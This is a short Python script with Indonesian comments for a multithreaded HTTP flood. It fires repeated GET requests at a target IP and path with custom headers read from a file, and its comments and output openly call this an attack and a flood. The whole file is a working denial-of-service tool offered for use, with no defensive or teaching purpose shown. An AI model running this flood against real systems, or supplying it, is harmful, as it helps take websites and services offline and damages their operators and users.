import requests
import threading
import sys

# Fungsi untuk membaca header dari file
def load_headers(file_path):
    headers = {}
    with open(file_path, 'r') as file:
        for line in file:
            if line.strip():  # Skip empty lines
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()
    return headers

# Load headers from file
headers = load_headers("header.txt")

# Fungsi untuk mengirim permintaan
def send_request(ip, url_path):
    url = f"http://{ip}{url_path}"
    try:
        response = requests.get(url, headers=headers)
        print(f"Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

# Fungsi untuk memulai serangan dengan sejumlah thread
def start_flood(ip, url_path, thread_count, request_count):
    threads = []

    def thread_func():
        for _ in range(request_count):
            send_request(ip, url_path)

    for _ in range(thread_count):
        thread = threading.Thread(target=thread_func)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Main function
def main():
    if len(sys.argv) != 6:
        print("Usage: python script.py <target_ip> <url_path> <thread_count> <request_count> <header_file>")
        sys.exit(1)

    ip = sys.argv[1]
    url_path = sys.argv[2]
    thread_count = int(sys.argv[3])
    request_count = int(sys.argv[4])
    header_file = sys.argv[5]

    # Load headers from specified file
    global headers
    headers = load_headers(header_file)

    print(f"Starting flood on {ip}{url_path} with {thread_count} threads and {request_count} requests per thread")
    start_flood(ip, url_path, thread_count, request_count)

if __name__ == "__main__":
    main()
